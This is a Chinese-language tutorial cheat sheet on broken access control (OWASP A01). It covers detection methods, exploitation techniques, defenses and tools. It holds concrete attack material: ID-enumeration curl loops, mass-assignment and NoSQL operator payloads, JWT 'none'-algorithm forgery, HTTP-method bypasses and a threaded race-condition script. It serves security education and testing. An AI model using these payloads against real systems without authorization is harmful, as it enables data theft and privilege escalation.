# 🔐 失效的访问控制（A01: Broken Access Control）全技巧

> **OWASP Top 10 2021 — 第1位**  
> 访问控制强制策略失效，导致攻击者可以越权访问未授权的功能或数据。

---

## 📋 一、漏洞基础

### 1.1 什么是访问控制？

访问控制决定了"已认证用户**有权做什么**"。它管理用户对资源、功能和数据的操作权限。

### 1.2 常见类型

| 类型 | 说明 | 风险等级 |
|------|------|----------|
| 🔴 **垂直越权** | 普通用户执行管理员操作（如访问 `/admin`） | ⭐⭐⭐⭐⭐ |
| 🟠 **水平越权** | 用户A访问用户B的数据（如修改ID参数） | ⭐⭐⭐⭐⭐ |
| 🟡 **IDOR** | 不安全的直接对象引用（Insecure Direct Object Reference） | ⭐⭐⭐⭐ |
| 🟢 **路径遍历** | 通过 `../` 访问未授权目录 | ⭐⭐⭐⭐ |
| 🔵 **CORS配置不当** | 跨域资源访问控制缺失 | ⭐⭐⭐ |

### 1.3 危害

- 信息泄露：查看其他用户的私密数据
- 数据篡改：修改他人或系统的配置
- 权限提升：从普通用户变为管理员
- 完全控制：接管整个应用系统

---

## 🔍 二、基础检测技巧

### 2.1 手工检测方法

#### 垂直越权检测
```http
# 普通用户尝试访问管理员接口
GET /api/admin/users HTTP/1.1
Cookie: session=普通用户session
```
> ✅ 若返回200，则存在垂直越权

#### 水平越权检测
```http
GET /api/user/1001/profile HTTP/1.1
Cookie: session=用户A的session
# 将 1001 改为 1002、1003... 看是否能获取他人数据
```

#### IDOR 检测
```http
# 修改订单号、发票ID等数字参数
POST /api/cancel-order HTTP/1.1
Content-Type: application/json

{"order_id": 10086}
# 尝试改为 10087、10085 看是否能取消他人订单
```

### 2.2 自动化检测工具

```bash
# Burp Suite - 使用 Autorize / Authz 插件自动检测越权
# 1. 先录制低权限用户的请求
# 2. 使用高权限session重放
# 3. 比较响应差异

# 使用 ffuf 模糊测试
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/api.txt -H "Cookie: session=lowpriv"

# 批量测试IDOR
for id in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/user/$id/profile"
done
```

---

## 🚀 三、进阶利用技巧

### 3.1 参数篡改高级技巧

#### 编码绕过
```
# 原始: /api/user/1001
# URL编码: /api/user/%31303031
# 双重编码: /api/user/%2531303031
# Unicode: /api/user/%u00310030...
```

#### 类型混淆绕过
```json
// 服务端可能用数字类型比较，改为数组或对象绕过
{"user_id": 1001}     →  {"user_id": [1001]}
{"user_id": "1001"}   →  {"user_id": {"$ne": -1}}
```

#### HTTP方法绕过
```http
# REST API 常对不同方法做不同权限检查
GET    /api/admin/deleteUser    → 405 Method Not Allowed
POST   /api/admin/deleteUser    → 403 Forbidden
PUT    /api/admin/deleteUser    → 200 OK (绕过！)
DELETE /api/admin/deleteUser    → 401 Unauthorized
PATCH  /api/admin/deleteUser    → 200 OK (绕过！)
```

### 3.2 批量赋值（Mass Assignment）

```json
// 注册时仅应传 username/password
// 如果后端自动绑定所有参数，可以尝试添加额外字段
POST /api/register
{
  "username": "hacker",
  "password": "123456",
  "role": "admin",        // ← 越权提权！
  "is_admin": true,       // ← 尝试不同字段名
  "isAdmin": true,
  "admin": 1,
  "permission": "super"
}
```

### 3.3 JWT 令牌伪造越权

```python
# 若JWT验证有缺陷，可直接篡改payload
# 原始token（base64解码后）：
{"user": "user1001", "role": "user", "iat": 1700000000}

# 篡改为：
{"user": "user1001", "role": "admin", "iat": 1700000000}

# 攻击技巧：
# 1. 将算法改为 "none" → jwt.none()
# 2. 使用空密钥签名 → jwt.sign(payload, "", algorithm="HS256")
# 3. 算法混淆：RS256公钥已知时用公钥做HMAC签名
```

### 3.4 Referer/Origin 头绕过

```http
# 有些后台仅检查 Referer 头
GET /admin/dashboard HTTP/1.1
Referer: https://admin.target.com/任意页面

# 伪造 Referer
Referer: https://admin.target.com/
```

### 3.5 GraphQL 越权利用

```graphql
# GraphQL 批量查询可能绕过单点权限控制
query {
  user(id: 1001) { email, phone }
  user(id: 1002) { email, phone }  # ← 水平越权
  adminUsers {                      # ← 垂直越权
    id, name, role
  }
}
```

### 3.6 条件竞争绕过

```python
# 利用多线程并发请求绕过一次性权限检查
import threading
import requests

def buy_item():
    requests.post("https://target.com/api/buy", 
                  json={"item": "钻石", "price": 10000})

# 并发100个请求，可能余额检查未及时更新
for _ in range(100):
    threading.Thread(target=buy_item).start()
```

---

## 🛡️ 四、防御方案

### 4.1 代码层面

```python
# Flask 示例：强制在每个端点检查权限
from functools import wraps

def require_role(role):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            current_role = session.get('role')
            if current_role != role:
                abort(403)  # 默认拒绝！
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/api/admin/users')
@require_role('admin')  # 声明式权限控制
def admin_users():
    return get_all_users()
```

### 4.2 通用防御原则

| 原则 | 说明 |
|------|------|
| ✅ **默认拒绝** | 未明确授权的一律拒绝 |
| ✅ **中央化权限** | 统一权限管理，不分散在各处 |
| ✅ **服务端校验** | 前端隐藏菜单不够，必须服务端验证 |
| ✅ **不可预测ID** | 使用UUID/GUID替代自增ID |
| ✅ **最小权限** | 每个角色仅给最小必要权限 |
| ✅ **日志审计** | 记录所有越权尝试 |

### 4.3 自动化测试防御

```bash
# 使用 OWASP ZAP 自动化扫描
zap-cli quick-scan --ajax --spider https://target.com

# Nuclei 模板检测
nuclei -t cves/ -l target.txt -tags auth-bypass
```

---

## 🎯 五、实战注意事项

### 5.1 经典测试流程

1. **枚举端点** → 发现隐藏API和管理接口
2. **确定角色** → 捕获不同权限用户的请求
3. **参数篡改** → 替换Cookie、Token、ID参数
4. **方法切换** → GET→POST→PUT→DELETE→PATCH
5. **批量测试** → 自动化模糊测试所有参数
6. **提权尝试** → 寻找从User到Admin的路径

### 5.2 推荐工具

| 工具 | 用途 |
|------|------|
| Burp Suite + Autorize | 自动越权检测 |
| JWT_Tool | JWT伪造与攻击 |
| ffuf | 目录/参数模糊测试 |
| OWASP ZAP | 自动扫描 |
| GraphQL Raider (Burp) | GraphQL安全测试 |

---

> **💡 核心原则**：永远不要信任客户端传过来的权限信息，每个请求都要在服务端重新验证！
